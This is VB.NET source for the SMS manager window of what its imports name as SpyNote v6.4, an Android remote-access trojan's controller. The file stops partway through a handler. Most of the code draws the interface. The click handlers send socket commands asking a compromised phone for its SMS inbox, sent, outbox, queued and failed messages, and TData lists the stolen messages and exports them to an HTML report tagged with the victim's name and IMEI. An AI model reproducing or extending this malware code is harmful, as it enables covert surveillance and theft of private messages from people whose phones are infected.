Imports Microsoft.VisualBasic.CompilerServices
Imports System.Drawing.Drawing2D
Imports System.Runtime.InteropServices
Imports System.Text
Imports SpyNote_V6._4.SN
Imports SpyNote_V6._4.SN.SpyNote.Stores
Imports SpyNote_V6._4.SN.Sockets.SpyNote.Client

Public Class SMSManager
    Public TClient As SocketClient

    Public ToolTip_0 As SN.ToolTip_0

    Private x As Integer

    Private y As Integer

    Private speed As Integer

    Private speed1 As Integer

    Private Const EM_SCROLL As Integer = 181

    Private Const SB_LINEDOWN As Integer = 1

    Private Const SB_LINEUP As Integer = 0

    Private w500 As Boolean

    Private aq1 As Integer

    Private bo As Boolean
    Public Sub New()
        Me.ToolTip_0 = New SN.ToolTip_0()
        Me.w500 = False
        Me.bo = False
        Me.InitializeComponent()
    End Sub

    Private Sub ALOLO_Resize(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Resize
        If (Me.PNLRD.Visible) Then
            If (MyBase.Width <= Me.PNLRD.Width + 30) Then
                If (Me.PNLRD.Dock <> DockStyle.Fill) Then
                    Me.PNLRD.Dock = DockStyle.Fill
                    Me.Panel3.Visible = False
                    Me.bo = True
                    Me.BTNDOCK.ImageChoice = Store.Bitmap_0("SMS\r")
                    Me.BTNDOCK.ImageAlignment = ThemeButtonImge.__ImageAlignment.Left
                    Me.BTNDOCK.Refresh()
                End If
            End If
        End If
        Me.BOXDOWN.Invalidate()
        Me.PNLRDMSG.Refresh()
        Me.Panel2.Refresh()
    End Sub

    Private Sub BOXDOWN_Paint(ByVal sender As Object, ByVal e As PaintEventArgs) Handles BOXDOWN.Paint
        Dim color As System.Drawing.Color = System.Drawing.Color.FromArgb(30, 30, 30)
        Dim rectangle As System.Drawing.Rectangle = New System.Drawing.Rectangle(0, 0, Me.BOXDOWN.Width, Me.BOXDOWN.Height)
        ControlPaint.DrawBorder(e.Graphics, rectangle, color, 1, ButtonBorderStyle.None, color, 1, ButtonBorderStyle.Solid, color, 1, ButtonBorderStyle.None, color, 1, ButtonBorderStyle.None)
        Dim font As System.Drawing.Font = New System.Drawing.Font("Segoe UI Semibold", 8.25!, FontStyle.Regular)
        Dim solidBrush As System.Drawing.Brush = New System.Drawing.SolidBrush(System.Drawing.Color.FromArgb(255, 241, 241, 241))
        Dim rowCount As Integer = Me.ViewManager.Rows.GetRowCount(DataGridViewElementStates.Selected)
        Dim str As String = String.Concat("Selected ", rowCount.ToString())
        Dim backColor As System.Drawing.Color = Me.BOXDOWN.BackColor
        Dim r As Byte = backColor.R
        backColor = Me.BOXDOWN.BackColor
        Dim g As Byte = backColor.G
        backColor = Me.BOXDOWN.BackColor
        Dim brush As System.Drawing.Brush = New System.Drawing.SolidBrush(System.Drawing.Color.FromArgb(220, CInt(r), CInt(g), CInt(backColor.B)))
        Dim size As System.Drawing.Size = TextRenderer.MeasureText(String.Concat("Ln ", Me.aq1.ToString()), font)
        Dim size1 As System.Drawing.Size = TextRenderer.MeasureText(str, font)
        Dim rectangle1 As System.Drawing.Rectangle = New System.Drawing.Rectangle(0, 2, Me.BOXDOWN.Width, size1.Height)
        e.Graphics.FillRectangle((New Pen(brush)).Brush, rectangle1)
        e.Graphics.DrawString(str, font, solidBrush, 0!, 2.0!)
        Dim num As Integer = CInt(Math.Round(CDbl(Me.BOXDOWN.Width) / 2))
        Dim width As Integer = Me.BOXDOWN.Width - size.Width
        rowCount = Me.ViewManager.Rows.Count
        Dim size2 As System.Drawing.Size = TextRenderer.MeasureText(String.Concat("Count ", rowCount.ToString()), font)
        Dim rectangle2 As System.Drawing.Rectangle = New System.Drawing.Rectangle(num, 2, Me.BOXDOWN.Width, size2.Height)
        e.Graphics.FillRectangle((New Pen(brush)).Brush, rectangle2)
        Dim graphics As System.Drawing.Graphics = e.Graphics
        rowCount = Me.ViewManager.Rows.Count
        graphics.DrawString(String.Concat("Count ", rowCount.ToString()), font, solidBrush, CSng(num), 2.0!)
        Dim rectangle3 As System.Drawing.Rectangle = New System.Drawing.Rectangle(width, 2, Me.BOXDOWN.Width, size.Height)
        e.Graphics.FillRectangle((New Pen(brush)).Brush, rectangle3)
        e.Graphics.DrawString(String.Concat("Ln ", Me.aq1.ToString()), font, solidBrush, CSng(width), 2.0!)
    End Sub

    Private Sub BTNDOCK_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BTNDOCK.Click
        Me.CLK()
    End Sub

    Private Sub CLK()
        If (Me.bo) Then
            Me.PNLRD.Dock = DockStyle.Right
            Me.Panel3.Visible = True
            Me.bo = False
            Me.BTNDOCK.ImageChoice = Store.Bitmap_0("SMS\l")
            Me.BTNDOCK.ImageAlignment = ThemeButtonImge.__ImageAlignment.Right
            Me.BTNDOCK.Refresh()
        Else
            Me.PNLRD.Dock = DockStyle.Fill
            Me.Panel3.Visible = False
            Me.bo = True
            Me.BTNDOCK.ImageChoice = Store.Bitmap_0("SMS\r")
            Me.BTNDOCK.ImageAlignment = ThemeButtonImge.__ImageAlignment.Left
            Me.BTNDOCK.Refresh()
        End If
    End Sub
    Private Sub DwonTimer_Tick(sender As Object, e As EventArgs) Handles DwonTimer.Tick
        SMSManager.SendMessage(Me.RichTextBox1.Handle, 181, 1, 1)
        Dim flag As Boolean = Me.speed > 30 And Me.speed <> -1
        If flag Then
            Me.DwonTimer.Interval = 1
            Me.speed = -1
        Else
            Dim flag2 As Boolean = Me.speed <> -1
            If flag2 Then
                Me.speed += 1
            Else
                SMSManager.SendMessage(Me.RichTextBox1.Handle, 181, 1, 1)
                SMSManager.SendMessage(Me.RichTextBox1.Handle, 181, 1, 1)
                SMSManager.SendMessage(Me.RichTextBox1.Handle, 181, 1, 1)
                SMSManager.SendMessage(Me.RichTextBox1.Handle, 181, 1, 1)
            End If
        End If
    End Sub
    Private Sub getMsg(ByVal int As Integer)
        If (Me.w500) Then
            Me.PictureBox1.Image = DirectCast(Me.ViewManager.Rows(int).Cells(0).Value, Image)
            Me.Label1.Text = Conversions.ToString(Operators.ConcatenateObject("Name:", Me.ViewManager.Rows(int).Cells(2).Value))
            Me.Label2.Text = Conversions.ToString(Operators.ConcatenateObject("Address:", Me.ViewManager.Rows(int).Cells(1).Value))
            Me.RichTextBox1.Text = Conversions.ToString(Me.ViewManager.Rows(int).Tag)
            If (Not Me.PNLRD.Visible) Then
                Me.PNLRD.Visible = True
            End If
        End If
    End Sub

    Private Sub GridViewoVerticalScrollBar0()
        Dim flag As Boolean = Me.PCNOTF.Visible > False
        If flag Then
            Dim flag2 As Boolean = Me.VisualStudioHorizontalScrollBar1.Visible > False
            If flag2 Then
                Me.VisualStudioHorizontalScrollBar1.Visible = False
            End If
            Dim flag3 As Boolean = Me.VisualStudioVerticalScrollBar1.Visible > False
            If flag3 Then
                Me.VisualStudioVerticalScrollBar1.Visible = False
            End If
        Else
            Dim columnsWidth As Integer = Me.ViewManager.Columns.GetColumnsWidth(DataGridViewElementStates.Visible)
            Dim flag4 As Boolean = columnsWidth >= Me.ViewManager.Width
            If flag4 Then
                Me.VisualStudioHorizontalScrollBar1.Maximum = columnsWidth - Me.ViewManager.Width
            Else
                Me.VisualStudioHorizontalScrollBar1.Maximum = columnsWidth
            End If
            Dim flag5 As Boolean = columnsWidth > Me.ViewManager.Width
            If flag5 Then
                Dim flag6 As Boolean = Not Me.VisualStudioHorizontalScrollBar1.Visible
                If flag6 Then
                    Me.VisualStudioHorizontalScrollBar1.Visible = True
                End If
            Else
                Dim flag7 As Boolean = Me.VisualStudioHorizontalScrollBar1.Visible > False
                If flag7 Then
                    Me.VisualStudioHorizontalScrollBar1.Visible = False
                End If
            End If
            Dim flag8 As Boolean = Me.ViewManager.Rows.Count > 0
            If flag8 Then
                Dim num As Integer = Me.ViewManager.Rows.Count * Me.ViewManager.Rows(0).Height
                Dim flag9 As Boolean = num > Me.ViewManager.Height
                If flag9 Then
                    Dim flag10 As Boolean = Not Me.VisualStudioVerticalScrollBar1.Visible
                    If flag10 Then
                        Me.VisualStudioVerticalScrollBar1.Visible = True
                    End If
                Else
                    Dim flag11 As Boolean = Me.VisualStudioVerticalScrollBar1.Visible > False
                    If flag11 Then
                        Me.VisualStudioVerticalScrollBar1.Visible = False
                    End If
                End If
            Else
                Dim flag12 As Boolean = Me.VisualStudioVerticalScrollBar1.Visible > False
                If flag12 Then
                    Me.VisualStudioVerticalScrollBar1.Visible = False
                End If
            End If
        End If
    End Sub

    Private Function IMG(ByVal ad As String, ByVal n As String) As Object
        Dim bitmap As Object
        Dim upper As String
        Dim chr As Char
        Dim color As System.Drawing.Color = System.Drawing.Color.FromArgb(74, 74, 75)
        If (Operators.CompareString(n, "null", False) <> 0 And n.Length > 0) Then
            chr = n(0)
            upper = chr.ToString().ToUpper()
        ElseIf (ad.Length <= 0) Then
            upper = "?"
        Else
            chr = ad(0)
            upper = chr.ToString().ToUpper()
        End If
        Dim solidBrush As Brush = New System.Drawing.SolidBrush(System.Drawing.Color.FromArgb(190, 190, 190))
        Dim font As System.Drawing.Font = New System.Drawing.Font("Segoe UI Semibold", 9.0!, FontStyle.Regular)
        Dim size As System.Drawing.Size = TextRenderer.MeasureText(upper, font)
        Dim bitmap1 As System.Drawing.Bitmap = New System.Drawing.Bitmap(35, 35)
        Dim num As Integer = 18 - CInt(Math.Round(CDbl(size.Width) / 2)) - 1
        Dim num1 As Integer = 18 - CInt(Math.Round(CDbl(size.Height) / 2)) - 3
        Using bitmap2 As System.Drawing.Bitmap = New System.Drawing.Bitmap(bitmap1.Width - 3, bitmap1.Height - 3)
            Using graphic As Graphics = Graphics.FromImage(bitmap2)
                graphic.SmoothingMode = SmoothingMode.AntiAlias
                graphic.FillEllipse(New System.Drawing.SolidBrush(color), 0, 0, bitmap1.Width - 6, bitmap1.Height - 6)
                graphic.DrawString(upper, font, solidBrush, CSng(num), CSng(num1))
                Using textureBrush As System.Drawing.TextureBrush = New System.Drawing.TextureBrush(bitmap1)
                    textureBrush.TranslateTransform(0!, 0!)
                    Using graphicsPath As System.Drawing.Drawing2D.GraphicsPath = New System.Drawing.Drawing2D.GraphicsPath()
                        graphicsPath.AddEllipse(0, 0, bitmap1.Width - 6, bitmap1.Height - 6)
                        graphic.FillPath(textureBrush, graphicsPath)
                    End Using
                End Using
            End Using
            bitmap = New System.Drawing.Bitmap(bitmap2)
        End Using
        Return bitmap
    End Function
    Private Sub LBER_Click(ByVal sender As Object, ByVal e As EventArgs) Handles LBER.Click
        Me.PNLERRORS.Visible = False
    End Sub

    Private Sub NF()
        If (Me.ViewManager.Rows.Count <= 0) Then
            If (Me.PCNOTF.Dock = DockStyle.None) Then
                Me.PCNOTF.Dock = DockStyle.Fill
            End If
            If (Not Me.PCNOTF.Visible) Then
                Me.PCNOTF.Visible = True
            End If
        Else
            If (Me.PCNOTF.Dock = DockStyle.Fill) Then
                Me.PCNOTF.Dock = DockStyle.None
            End If
            If (Me.PCNOTF.Visible) Then
                Me.PCNOTF.Visible = False
            End If
        End If
        If (Me.PNLRD.Dock <> DockStyle.Right) Then
            Me.PNLRD.Dock = DockStyle.Right
            Me.Panel3.Visible = True
            Me.bo = False
            Me.BTNDOCK.ImageChoice = Store.Bitmap_0("SMS\l")
            Me.BTNDOCK.ImageAlignment = ThemeButtonImge.__ImageAlignment.Right
            Me.BTNDOCK.Refresh()
        End If
    End Sub

    Private Sub p1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles p1.Click
        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(27)), Data.SplitData, "content://sms/", Data.SplitData, "True"}))
        Me.ONLICON.Enabled = False
    End Sub

    Private Sub p2_Click(ByVal sender As Object, ByVal e As EventArgs) Handles p2.Click
        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(27)), Data.SplitData, "content://sms/failed", Data.SplitData, "True"}))
        Me.ONLICON.Enabled = False
    End Sub

    Private Sub p3_Click(ByVal sender As Object, ByVal e As EventArgs) Handles p3.Click
        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(27)), Data.SplitData, "content://sms/queued", Data.SplitData, "True"}))
        Me.ONLICON.Enabled = False
    End Sub

    Private Sub p4_Click(ByVal sender As Object, ByVal e As EventArgs) Handles p4.Click
        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(27)), Data.SplitData, "content://sms/sent", Data.SplitData, "True"}))
        Me.ONLICON.Enabled = False
    End Sub

    Private Sub p5_Click(ByVal sender As Object, ByVal e As EventArgs) Handles p5.Click
        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(27)), Data.SplitData, "content://sms/outbox", Data.SplitData, "True"}))
        Me.ONLICON.Enabled = False
    End Sub

    Private Sub p6_Click(ByVal sender As Object, ByVal e As EventArgs) Handles p6.Click
        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(27)), Data.SplitData, "content://sms/inbox", Data.SplitData, "True"}))
        Me.ONLICON.Enabled = False
    End Sub

    Private Sub Panel2_Paint(ByVal sender As Object, ByVal e As PaintEventArgs) Handles Panel2.Paint
        Dim color As System.Drawing.Color = System.Drawing.Color.FromArgb(63, 63, 70)
        Dim rectangle As System.Drawing.Rectangle = New System.Drawing.Rectangle(0, 0, Me.Panel2.Width, Me.Panel2.Height)
        ControlPaint.DrawBorder(e.Graphics, rectangle, color, 1, ButtonBorderStyle.Solid, color, 1, ButtonBorderStyle.Solid, color, 1, ButtonBorderStyle.Solid, color, 1, ButtonBorderStyle.Solid)
    End Sub

    Private Sub PNLRDMSG_Paint(ByVal sender As Object, ByVal e As PaintEventArgs) Handles PNLRDMSG.Paint
        Dim color As System.Drawing.Color = System.Drawing.Color.FromArgb(63, 63, 70)
        Dim rectangle As System.Drawing.Rectangle = New System.Drawing.Rectangle(0, 0, Me.PNLRDMSG.Width, Me.PNLRDMSG.Height)
        ControlPaint.DrawBorder(e.Graphics, rectangle, color, 1, ButtonBorderStyle.Solid, color, 1, ButtonBorderStyle.None, color, 1, ButtonBorderStyle.Solid, color, 1, ButtonBorderStyle.Solid)
    End Sub

    Private Sub RefScrolls()
        Dim num As Integer = 0
        If (MyBase.Visible) Then
            SyncLock Me.ViewManager
                If (Me.ViewManager.Rows.Count > 0) Then
                    If (Me.ViewManager.Rows.Count * Me.ViewManager.Rows(0).Height > Me.ViewManager.Height) Then
                        num = CInt(Math.Round(CDbl(Me.ViewManager.Height) / CDbl(Me.ViewManager.Rows(0).Height))) - 2
                        If (num < 0) Then
                            num = 0
                        End If
                    End If
                End If
                Me.VisualStudioVerticalScrollBar1.Maximum = Me.ViewManager.Rows.Count - num
                Me.GridViewoVerticalScrollBar0()
            End SyncLock
        End If
    End Sub

    Private Sub RichTextBox1_MouseWheel(ByVal sender As Object, ByVal e As MouseEventArgs) Handles RichTextBox1.MouseWheel
        Dim flag As Boolean = e.Delta > 0
        If flag Then
            SMSManager.SendMessage(Me.RichTextBox1.Handle, 181, 0, 0)
        Else
            SMSManager.SendMessage(Me.RichTextBox1.Handle, 181, 1, 1)
        End If
    End Sub

    Private Sub RSELC(ByVal sl As String)
        Dim str As String = sl
        If (Operators.CompareString(str, "/", False) = 0) Then
            Me.p1.BackColorNone0_S = Color.FromArgb(32, 146, 255)
            Me.p2.BackColorNone0_S = Color.FromArgb(45, 45, 48)
            Me.p3.BackColorNone0_S = Color.FromArgb(45, 45, 48)
            Me.p4.BackColorNone0_S = Color.FromArgb(45, 45, 48)
            Me.p5.BackColorNone0_S = Color.FromArgb(45, 45, 48)
            Me.p6.BackColorNone0_S = Color.FromArgb(45, 45, 48)
        ElseIf (Operators.CompareString(str, "/failed", False) = 0) Then
            Me.p2.BackColorNone0_S = Color.FromArgb(32, 146, 255)
            Me.p1.BackColorNone0_S = Color.FromArgb(45, 45, 48)
            Me.p3.BackColorNone0_S = Color.FromArgb(45, 45, 48)
            Me.p4.BackColorNone0_S = Color.FromArgb(45, 45, 48)
            Me.p5.BackColorNone0_S = Color.FromArgb(45, 45, 48)
            Me.p6.BackColorNone0_S = Color.FromArgb(45, 45, 48)
        ElseIf (Operators.CompareString(str, "/queued", False) = 0) Then
            Me.p3.BackColorNone0_S = Color.FromArgb(32, 146, 255)
            Me.p2.BackColorNone0_S = Color.FromArgb(45, 45, 48)
            Me.p1.BackColorNone0_S = Color.FromArgb(45, 45, 48)
            Me.p4.BackColorNone0_S = Color.FromArgb(45, 45, 48)
            Me.p5.BackColorNone0_S = Color.FromArgb(45, 45, 48)
            Me.p6.BackColorNone0_S = Color.FromArgb(45, 45, 48)
        ElseIf (Operators.CompareString(str, "/sent", False) = 0) Then
            Me.p4.BackColorNone0_S = Color.FromArgb(32, 146, 255)
            Me.p2.BackColorNone0_S = Color.FromArgb(45, 45, 48)
            Me.p3.BackColorNone0_S = Color.FromArgb(45, 45, 48)
            Me.p1.BackColorNone0_S = Color.FromArgb(45, 45, 48)
            Me.p5.BackColorNone0_S = Color.FromArgb(45, 45, 48)
            Me.p6.BackColorNone0_S = Color.FromArgb(45, 45, 48)
        ElseIf (Operators.CompareString(str, "/outbox", False) = 0) Then
            Me.p5.BackColorNone0_S = Color.FromArgb(32, 146, 255)
            Me.p2.BackColorNone0_S = Color.FromArgb(45, 45, 48)
            Me.p3.BackColorNone0_S = Color.FromArgb(45, 45, 48)
            Me.p4.BackColorNone0_S = Color.FromArgb(45, 45, 48)
            Me.p1.BackColorNone0_S = Color.FromArgb(45, 45, 48)
            Me.p6.BackColorNone0_S = Color.FromArgb(45, 45, 48)
        ElseIf (Operators.CompareString(str, "/inbox", False) = 0) Then
            Me.p6.BackColorNone0_S = Color.FromArgb(32, 146, 255)
            Me.p2.BackColorNone0_S = Color.FromArgb(45, 45, 48)
            Me.p3.BackColorNone0_S = Color.FromArgb(45, 45, 48)
            Me.p4.BackColorNone0_S = Color.FromArgb(45, 45, 48)
            Me.p5.BackColorNone0_S = Color.FromArgb(45, 45, 48)
            Me.p1.BackColorNone0_S = Color.FromArgb(45, 45, 48)
        End If
        Me.p1.Refresh()
        Me.p2.Refresh()
        Me.p3.Refresh()
        Me.p4.Refresh()
        Me.p5.Refresh()
        Me.p6.Refresh()
    End Sub

    <DllImport("user32.dll", CharSet:=CharSet.Ansi, EntryPoint:="SendMessageA", ExactSpelling:=True, SetLastError:=True)>
    Private Shared Function SendMessage(ByVal hWnd As IntPtr, ByVal msg As Integer, ByVal wParam As Integer, ByVal lParam As Integer) As Integer
    End Function

    Private Sub SMSManager_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        MyBase.Icon = New System.Drawing.Icon(String.Concat(Store.Resources(1), "\Icons\window\win\3.ico"))
        Me.ToolTip_0._ToolTip.SetToolTip(Me.p1, "All")
        Me.ToolTip_0._ToolTip.SetToolTip(Me.p2, "Failed")
        Me.ToolTip_0._ToolTip.SetToolTip(Me.p3, "Queued")
        Me.ToolTip_0._ToolTip.SetToolTip(Me.p4, "Sent")
        Me.ToolTip_0._ToolTip.SetToolTip(Me.p5, "Outbox")
        Me.ToolTip_0._ToolTip.SetToolTip(Me.p6, "Inbox")
        Me.RichTextBox1.ContextMenuStrip = ContextRicBox.ContextMenuContextRicBox
        Me.ViewManager.ContextMenuStrip = ContextGriedView.ContextMenuContextGriedView
        Me.ThemeButton1.ImageChoice = Store.Bitmap_0("Note\Nup")
        Me.ThemeButton1.ShowImage = True
        Me.ThemeButton2.ImageChoice = Store.Bitmap_0("Note\Ndown")
        Me.ThemeButton2.ShowImage = True
        Me.PNLRD.Visible = False
        Me.PCNOTF.Image = Store.Bitmap_0("NFD\nf")
        Me.BTNDOCK.ImageChoice = Store.Bitmap_0("SMS\l")
        Me.BTNDOCK.ShowImage = True
        Me.p1.ImageChoice = Store.Bitmap_0("SMS\all")
        Me.p1.ShowImage = True
        Me.p2.ImageChoice = Store.Bitmap_0("SMS\failed")
        Me.p2.ShowImage = True
        Me.p3.ImageChoice = Store.Bitmap_0("SMS\queued")
        Me.p3.ShowImage = True
        Me.p4.ImageChoice = Store.Bitmap_0("SMS\sent")
        Me.p4.ShowImage = True
        Me.p5.ImageChoice = Store.Bitmap_0("SMS\outbox")
        Me.p5.ShowImage = True
        Me.p6.ImageChoice = Store.Bitmap_0("SMS\inbox")
        Me.p6.ShowImage = True
        Me.TScrolls.Interval = Store.TScrollsInterval
        Me.TProgressBar.Interval = Store.TProgressBarInterval
        Me.TProgressBar.Enabled = True
        Me.TScrolls.Enabled = True
        Me.Trans.Interval = Store.transparency
        Me.Trans.Enabled = True
    End Sub

    Public Sub TData(ByVal Ay As Array)
        Me.w500 = False
        If (Not Me.ONLICON.Enabled) Then
            Me.ONLICON.Enabled = True
        End If
        Try
            Dim value As String = CStr(Ay.GetValue(0))
            If (Operators.CompareString(value, Store.BFF(Store.buff, CLng(83)), False) = 0) Then
                Dim str As String = CStr(Ay.GetValue(1))
                Dim value1 As String = CStr(Ay.GetValue(2))
                If (value1.StartsWith("content://sms")) Then
                    value1 = value1.Replace("content://sms", "")
                End If
                Me.RSELC(value1)
                If (Operators.CompareString(str.ToString().Trim(), "null", False) <> 0) Then
                    Me.LBER.Text = str
                    Me.PNLERRORS.Visible = True
                    Me.PNLERRORS.Refresh()
                Else
                    Me.ViewManager.Rows.Clear()
                End If
            ElseIf (Operators.CompareString(value, Store.BFF(Store.buff, CLng(84)), False) = 0) Then
                Me.ViewManager.Rows.Clear()
                Dim stringBuilder As System.Text.StringBuilder = New System.Text.StringBuilder()
                stringBuilder.Append(String.Concat("<title>Spy Note - ", MyBase.Name, "</title>"))
                Dim stringBuilder1 As System.Text.StringBuilder = New System.Text.StringBuilder()
                stringBuilder1.Append(String.Concat(New String() {"</tr><th>", Me.ViewManager.Columns(1).HeaderText, "</th><th>", Me.ViewManager.Columns(2).HeaderText, "</th><th>", Me.ViewManager.Columns(3).HeaderText, "</th><th>message</th><tr>"}))
                Dim stringBuilder2 As System.Text.StringBuilder = New System.Text.StringBuilder()
                Dim str1 As String = Nothing
                Dim strArrays As String() = CStr(Ay.GetValue(1)).Split(New String() {Data.SplitLines}, StringSplitOptions.RemoveEmptyEntries)
                Dim length As Integer = CInt(strArrays.Length) - 1
                Dim num As Integer = 0
                Do
                    Dim strArrays1 As String() = strArrays(num).Split(New String() {Data.SplitArray}, StringSplitOptions.RemoveEmptyEntries)
                    Me.ViewManager.Rows.Add(New Object() {Me.IMG(strArrays1(0), strArrays1(1)), strArrays1(0), strArrays1(1), strArrays1(2), strArrays1(3)})
                    Dim count As Integer = Me.ViewManager.Rows.Count - 1
                    Me.ViewManager.Rows(count).Tag = strArrays1(4)
                    If (Operators.CompareString(str1, Nothing, False) = 0) Then
                        str1 = strArrays1(6)
                    End If
                    stringBuilder2.Append(String.Concat(New String() {"</tr> <td>", strArrays1(1), "</td><td>", strArrays1(0), "</td><td>", strArrays1(2), "</td><td>", strArrays1(4), "</td><tr>" & vbCrLf & ""}))
                    num = num + 1
                Loop While num <= length
                Me.RSELC(str1)
                If (stringBuilder2.Length > 0) Then
                    Store.StartThread(DirectCast((New Object() {stringBuilder, stringBuilder1, stringBuilder2, String.Concat(Me.TClient.ClientName, "_", Me.TClient.ClientImei), "smsManager"}), Array))
                End If
            End If
            If (Me.PNLRD.Visible) Then
                Me.PNLRD.Visible = False
            End If
        Catch exception As System.Exception
        End Try
        Try
            Me.NF()
        Catch exception1 As System.Exception
        End Try
        Me.w500 = True
    End Sub

    Private Sub ThemeButton1_MouseDown(ByVal sender As Object, ByVal e As MouseEventArgs) Handles ThemeButton1.MouseDown
        Me.UPTimer.Enabled = True
    End Sub

    Private Sub ThemeButton1_MouseUp(ByVal sender As Object, ByVal e As MouseEventArgs) Handles ThemeButton1.MouseUp
        Me.UPTimer.Enabled = False
        Me.UPTimer.Interval = 40
        Me.speed1 = 0
    End Sub

    Private Sub ThemeButton2_MouseDown(ByVal sender As Object, ByVal e As MouseEventArgs) Handles ThemeButton2.MouseDown
        Me.DwonTimer.Enabled = True
    End Sub

    Private Sub ThemeButton2_MouseUp(ByVal sender As Object, ByVal e As MouseEventArgs) Handles ThemeButton2.MouseUp
        Me.DwonTimer.Enabled = False
        Me.DwonTimer.Interval = 40
        Me.speed = 0
    End Sub

    Private Sub TProgressBar_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TProgressBar.Tick
        If (Me.TClient Is Nothing) Then
            Me.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(MyBase.Tag, Strings.Space(1)), "-> Connection Lost ..."))
            If (Me.ProgressBar1.Value <> 100) Then
                Me.ProgressBar1.Value = 100
                If (Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)) Then
                    Me.ProgressBar1.Colour0 = Color.FromArgb(128, 128, 128)
                    Me.ProgressBar1.Colour1 = Color.FromArgb(88, 88, 88)
                End If
            End If
        ElseIf (Not Me.TClient.IsClose) Then
            If (Me.Text <> MyBase.Tag) Then
                Me.Text = Conversions.ToString(MyBase.Tag)
            End If
            If (Me.ProgressBar1.Colour1 <> Color.FromArgb(140, 140, 140)) Then
                Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)
                Me.ProgressBar1.Colour0 = Color.FromArgb(140, 140, 140)
            End If
            Me.ProgressBar1.Value = Me.TClient.mProgressBar(Store.BFF(Store.buff, CLng(27)), "null")
        Else
            Me.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(MyBase.Tag, Strings.Space(1)), "-> Connection Lost ..."))
            If (Me.ProgressBar1.Value <> 100) Then
                Me.ProgressBar1.Value = 100
                If (Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)) Then
                    Me.ProgressBar1.Colour0 = Color.FromArgb(128, 128, 128)
                    Me.ProgressBar1.Colour1 = Color.FromArgb(88, 88, 88)
                End If
            End If
        End If
    End Sub

    Private Sub Trans_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Trans.Tick
        If (MyBase.Opacity = 1) Then
            Me.Trans.Enabled = False
        Else
            MyBase.Opacity = MyBase.Opacity + 0.1
        End If
    End Sub

    Private Sub TScrolls_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TScrolls.Tick
        Me.RefScrolls()
    End Sub
    Private Sub UPTimer_Tick(sender As Object, e As EventArgs) Handles UPTimer.Tick
        SMSManager.SendMessage(Me.RichTextBox1.Handle, 181, 0, 0)
        Dim flag As Boolean = Me.speed1 > 30 And Me.speed1 <> -1
        If flag Then
            Me.UPTimer.Interval = 1
            Me.speed1 = -1
        Else
            Dim flag2 As Boolean = Me.speed1 <> -1
            If flag2 Then
                Me.speed1 += 1
            Else
                SMSManager.SendMessage(Me.RichTextBox1.Handle, 181, 0, 0)
                SMSManager.SendMessage(Me.RichTextBox1.Handle, 181, 0, 0)
                SMSManager.SendMessage(Me.RichTextBox1.Handle, 181, 0, 0)
                SMSManager.SendMessage(Me.RichTextBox1.Handle, 181, 0, 0)
            End If
        End If
    End Sub
    Private Sub ViewManager_CellClick(ByVal sender As Object, ByVal e As DataGridViewCellEventArgs) Handles ViewManager.CellClick
        Try
            If (Not (e.RowIndex <> -1 And e.ColumnIndex <> -1)) Then
                Return
            Else
                Me.getMsg(e.RowIndex)
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub ViewManager_CellMouseClick(ByVal sender As Object, ByVal e As DataGridViewCellMouseEventArgs) Handles ViewManager.CellMouseClick
        If (e.RowIndex <> -1) Then
            Me.VisualStudioVerticalScrollBar1.Llen = If(e.RowIndex >= Me.VisualStudioVerticalScrollBar1.Maximum, Me.VisualStudioVerticalScrollBar1.Maximum, e.RowIndex)
        End If
    End Sub

    Private Sub ViewManager_MouseClick(ByVal sender As Object, ByVal e As MouseEventArgs) Handles ViewManager.MouseClick
        Me.BOXDOWN.Invalidate()
    End Sub

    Private Sub ViewManager_MouseWheel(ByVal sender As Object, ByVal e As MouseEventArgs) Handles ViewManager.MouseWheel
        If (e.Delta <= 1) Then
            Dim visualStudioVerticalScrollBar1 As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar1
            visualStudioVerticalScrollBar1.Value = visualStudioVerticalScrollBar1.Value + 1
        Else
            Dim value As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar1
            value.Value = value.Value - 1
        End If
    End Sub

    Private Sub ViewManager_RowEnter(ByVal sender As Object, ByVal e As DataGridViewCellEventArgs) Handles ViewManager.RowEnter
        Try
            If (Not (e.RowIndex <> -1 And e.ColumnIndex <> -1)) Then
                Return
            Else
                Me.getMsg(e.RowIndex)
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub ViewManager_RowsAdded(ByVal sender As Object, ByVal e As DataGridViewRowsAddedEventArgs) Handles ViewManager.RowsAdded
        Me.BOXDOWN.Invalidate()
    End Sub

    Private Sub ViewManager_RowsRemoved(ByVal sender As Object, ByVal e As DataGridViewRowsRemovedEventArgs) Handles ViewManager.RowsRemoved
        Me.BOXDOWN.Invalidate()
    End Sub

    Private Sub ViewManager_RowStateChanged(ByVal sender As Object, ByVal e As DataGridViewRowStateChangedEventArgs) Handles ViewManager.RowStateChanged
        If (e.Row.Index <> -1) Then
            If (e.StateChanged = DataGridViewElementStates.Selected) Then
                Me.aq1 = e.Row.Index + 1
                Me.VisualStudioVerticalScrollBar1.Llen = If(e.Row.Index >= Me.VisualStudioVerticalScrollBar1.Maximum, Me.VisualStudioVerticalScrollBar1.Maximum, e.Row.Index)
            End If
        ElseIf (e.StateChanged <> DataGridViewElementStates.Selected) Then
            Me.aq1 = 0
        Else
            Me.aq1 = 1
        End If
        Me.BOXDOWN.Invalidate()
    End Sub

    Private Sub ViewManager_Scroll(ByVal sender As Object, ByVal e As ScrollEventArgs) Handles ViewManager.Scroll
        If (e.ScrollOrientation <> ScrollOrientation.HorizontalScroll) Then
